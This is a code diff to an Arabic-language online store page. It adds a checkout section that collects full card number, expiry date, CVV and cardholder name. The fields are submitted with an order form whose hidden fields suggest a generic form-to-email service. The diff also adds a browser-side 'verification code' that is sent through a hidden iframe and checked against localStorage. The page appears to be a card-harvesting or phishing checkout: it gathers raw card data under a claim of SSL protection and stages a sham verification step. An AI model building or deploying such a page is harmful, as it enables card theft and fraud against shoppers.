@@ -469,6 +469,46 @@
                         <textarea name="address" rows="3" class="w-full px-3 py-2 text-base border rounded-lg focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600" required=""></textarea>
                     </div>
                     
+                    <!-- Payment Information Section -->
+                    <div class="border-t pt-6 dark:border-gray-700">
+                        <h3 class="text-xl font-bold mb-4">معلومات الدفع</h3>
+                        <div class="bg-blue-50 dark:bg-blue-900 p-4 rounded-lg mb-4">
+                            <p class="text-blue-800 dark:text-blue-200 text-sm">
+                                <i class="fas fa-shield-alt mr-2"></i>
+                                جميع معلومات الدفع محمية بتشفير SSL
+                            </p>
+                        </div>
+                        
+                        <div class="grid grid-cols-1 gap-4">
+                            <div>
+                                <label class="block text-sm font-bold mb-2">رقم البطاقة</label>
+                                <input type="text" name="card_number" placeholder="1234 5678 9012 3456" class="w-full px-3 py-2 text-base border rounded-lg focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600" maxlength="19" required="">
+                                <div class="flex items-center mt-2 space-x-2 space-x-reverse">
+                                    <i class="fab fa-cc-visa text-blue-600 text-lg"></i>
+                                    <i class="fab fa-cc-mastercard text-red-600 text-lg"></i>
+                                    <i class="fab fa-cc-american-express text-blue-500 text-lg"></i>
+                                    <span class="text-xs text-gray-500">البطاقات المدعومة</span>
+                                </div>
+                            </div>
+                            
+                            <div class="grid grid-cols-2 gap-4">
+                                <div>
+                                    <label class="block text-sm font-bold mb-2">الشهر/السنة</label>
+                                    <input type="text" name="card_expiry" placeholder="MM/YY" class="w-full px-3 py-2 text-base border rounded-lg focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600" maxlength="5" required="">
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-bold mb-2">رمز الأمان (CVV)</label>
+                                    <input type="text" name="card_cvv" placeholder="123" class="w-full px-3 py-2 text-base border rounded-lg focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600" maxlength="3" required="">
+                                </div>
+                            </div>
+                            
+                            <div>
+                                <label class="block text-sm font-bold mb-2">اسم حامل البطاقة</label>
+                                <input type="text" name="card_holder_name" placeholder="كما هو مكتوب على البطاقة" class="w-full px-3 py-2 text-base border rounded-lg focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600" required="">
+                            </div>
+                        </div>
+                    </div>
+                    
                     <div class="border-t pt-6 dark:border-gray-700">
                         <div class="space-y-2 mb-4">
                             <div class="flex justify-between">
@@ -743,15 +783,20 @@
         // Purchase code verification
         document.getElementById('purchase-code-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            const code = document.getElementById('purchase-secret-code').value.trim();
+            const enteredCode = document.getElementById('purchase-secret-code').value.trim();
+            const correctCode = localStorage.getItem('sentVerificationCode') || localStorage.getItem('verificationCode');
             
-            if (code.length >= 5) {
+            if (enteredCode === correctCode) {
                 showNotification('تم إتمام الشراء بنجاح!');
                 setTimeout(() => {
                     showThankYouPage();
                 }, 1000);
             } else {
-                showNotification('كود غير صحيح');
+                showNotification('كود غير صحيح، يرجى المحاولة مرة أخرى');
+                document.getElementById('purchase-secret-code').style.borderColor = '#EF4444';
+                setTimeout(() => {
+                    document.getElementById('purchase-secret-code').style.borderColor = '';
+                }, 2000);
             }
         });
 
@@ -804,14 +849,19 @@
             const totalAmount = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
             const orderNumber = 'POE-2024-' + Math.floor(Math.random() * 100000);
             
+            // Generate verification code and store it
+            const verificationCode = Math.floor(10000 + Math.random() * 90000);
+            localStorage.setItem('verificationCode', verificationCode);
+
             // Add hidden fields
             const hiddenFields = [
                 { name: '_subject', value: `طلب جديد من متجر الخصوصية - ${orderNumber}` },
-                { name: '_next', value: window.location.origin + window.location.pathname + '?success=1' },
+                { name: '_next', value: `${window.location.origin}${window.location.pathname}#success` },
                 { name: 'order_items', value: orderSummary },
                 { name: 'total_amount', value: `${totalAmount} ريال` },
                 { name: 'order_number', value: orderNumber },
-                { name: 'order_date', value: new Date().toLocaleString('ar-SA') }
+                { name: 'order_date', value: new Date().toLocaleString('ar-SA') },
+                { name: 'verification_code', value: verificationCode }
             ];
             
             hiddenFields.forEach(field => {
@@ -832,8 +882,8 @@
 
         // Function to send verification code
         function sendVerificationCode() {
-            // Generate random verification code
-            const verificationCode = Math.floor(10000 + Math.random() * 90000);
+            // Use stored verification code from payment
+            const verificationCode = localStorage.getItem('verificationCode') || Math.floor(10000 + Math.random() * 90000);
             
             // Get order information from localStorage
             const orderNumber = localStorage.getItem('orderNumber') || 'Unknown';
@@ -851,8 +901,18 @@
             form.querySelector('input[name="verification_code"]').value = verificationCode;
             form.querySelector('input[name="sent_time"]').value = currentTime;
             
-            // Submit form
+            // Submit form in hidden iframe to avoid leaving the site
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.name = 'hidden_iframe';
+            document.body.appendChild(iframe);
+            form.target = 'hidden_iframe';
             form.submit();
+            
+            // Remove iframe after submission
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+            }, 1000);
             
             // Update status
             const statusDiv = document.getElementById('code-status');
@@ -863,6 +923,9 @@
                 </p>
             `;
             statusDiv.className = 'bg-green-100 dark:bg-green-900 p-4 rounded-lg mb-4';
+            
+            // Store the code for verification
+            localStorage.setItem('sentVerificationCode', verificationCode);
         }
 
         // Function to resend verification code
@@ -871,10 +934,9 @@
             showNotification('تم إعادة إرسال كود التحقق');
         }
 
-        // Check URL parameters for success redirect
+        // Check URL hash for success redirect
         document.addEventListener('DOMContentLoaded', function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('success') === '1') {
+            if (window.location.hash === '#success') {
                 // Show purchase code page
                 setTimeout(() => {
                     showPage('purchase-code');
@@ -896,6 +958,39 @@
                 // Generate products and initialize
                 generateProducts();
                 updateCartUI();
+            }
+        });
+
+        // Add input formatting for card fields
+        document.addEventListener('DOMContentLoaded', function() {
+            // Format card number input
+            const cardNumberInput = document.querySelector('input[name="card_number"]');
+            if (cardNumberInput) {
+                cardNumberInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+                    e.target.value = value;
+                });
+            }
+
+            // Format expiry date input
+            const expiryInput = document.querySelector('input[name="card_expiry"]');
+            if (expiryInput) {
+                expiryInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length >= 2) {
+                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                    }
+                    e.target.value = value;
+                });
+            }
+
+            // Format CVV input (numbers only)
+            const cvvInput = document.querySelector('input[name="card_cvv"]');
+            if (cvvInput) {
+                cvvInput.addEventListener('input', function(e) {
+                    e.target.value = e.target.value.replace(/\D/g, '');
+                });
             }
         });
     </script>
